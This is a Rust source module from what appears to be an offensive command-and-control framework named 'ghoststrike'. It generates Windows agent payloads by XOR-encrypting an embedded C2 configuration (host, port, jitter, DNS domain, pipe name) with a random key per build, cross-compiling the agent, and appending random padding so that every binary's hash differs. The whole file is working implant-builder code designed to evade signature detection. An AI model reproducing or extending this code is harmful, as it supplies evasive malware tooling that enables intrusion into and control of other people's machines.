//! Payload generator.
//!
//! Uniqueness strategy (no LLVM required):
//!   1. Random 32-byte XOR key per build.
//!   2. JSON config serialised + XOR-encoded → agent_cfg.bin  (embedded via include_bytes!)
//!   3. The key itself                        → agent_key.bin  (embedded via include_bytes!)
//!   4. Random build_id string in the config — changes every binary.
//!   5. Random padding blob appended after the PE → different file hash every time.
//!
//! The agent reads agent_key.bin and agent_cfg.bin from OUT_DIR at compile time.
//! Each invocation of this builder writes fresh bytes to those files and recompiles.

use anyhow::{Context, Result};
use rand::RngCore;
use uuid::Uuid;

use ghoststrike_common::{xor_encode, BuildConfig, PayloadFormat};
use crate::mutator::Mutator;

pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
    let build_id = Uuid::new_v4().to_string();

    // 1. Inject build_id and serialise config.
    let mut cfg_with_id = cfg.clone();
    // build_id is not in BuildConfig; we serialise agent-side AgentConfig.
    let agent_cfg = serde_json::json!({
        "c2_host":    cfg.c2_host,
        "c2_port":    cfg.c2_port,
        "protocol":   cfg.protocol,
        "sleep_ms":   cfg.sleep_ms,
        "jitter_pct": cfg.jitter_pct,
        "dns_domain": cfg.dns_domain,
        "pipe_name":  cfg.pipe_name,
        "build_id":   build_id,
    });
    let plain = serde_json::to_vec(&agent_cfg)?;

    // 2. Generate random XOR key.
    let mut xor_key = vec![0u8; 32];
    rand::thread_rng().fill_bytes(&mut xor_key);

    // 3. Encrypt config.
    let encrypted_cfg = xor_encode(&plain, &xor_key);

    // 4. Write key + encrypted config to a temp directory for the agent crate's build.rs.
    let tmp = std::env::temp_dir().join("ghoststrike_build").join(&build_id);
    std::fs::create_dir_all(&tmp)?;
    let key_path = tmp.join("agent_key.bin");
    let cfg_path = tmp.join("agent_cfg.bin");
    std::fs::write(&key_path, &xor_key)?;
    std::fs::write(&cfg_path, &encrypted_cfg)?;

    println!("[*] Build ID:  {build_id}");
    println!("[*] XOR key:   {} bytes  (random per build)", xor_key.len());
    println!("[*] Config:    {} bytes  → {} bytes encrypted", plain.len(), encrypted_cfg.len());
    println!("[*] Key path:  {}", key_path.display());
    println!("[*] Cfg path:  {}", cfg_path.display());

    // 5. Cross-compile the agent crate.
    compile_agent(&tmp, output_path, &cfg, &build_id)?;

    // 6. Append random padding to change final file hash.
    if cfg.format == PayloadFormat::Exe {
        Mutator::append_random_padding(output_path)?;
    }

    Ok(build_id)
}

fn compile_agent(
    out_dir:     &std::path::Path,
    output_path: &str,
    cfg:         &BuildConfig,
    build_id:    &str,
) -> Result<()> {
    use std::process::Command;

    // Determine the workspace root (sibling of this crate).
    let agent_crate = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("agent");

    println!("[*] Compiling agent: {}", agent_crate.display());
    println!("[*] Target: x86_64-pc-windows-gnu");
    println!("[*] OUT_DIR → {}", out_dir.display());

    let status = Command::new("cargo")
        .args([
            "build",
            "--release",
            "--target", "x86_64-pc-windows-gnu",
            "-p", "ghoststrike-agent",
        ])
        .env("OUT_DIR", out_dir)
        // Pass build_id as an env var so build.rs can embed it.
        .env("GHOSTSTRIKE_BUILD_ID", build_id)
        .current_dir(agent_crate.parent().unwrap())
        .status()
        .context("cargo build failed")?;

    if !status.success() {
        anyhow::bail!("Agent compilation failed");
    }

    // Copy binary to output path.
    let compiled = agent_crate
        .parent()
        .unwrap()
        .join("target/x86_64-pc-windows-gnu/release/agent.exe");

    std::fs::copy(&compiled, output_path)
        .with_context(|| format!("copying {} → {output_path}", compiled.display()))?;

    Ok(())
}
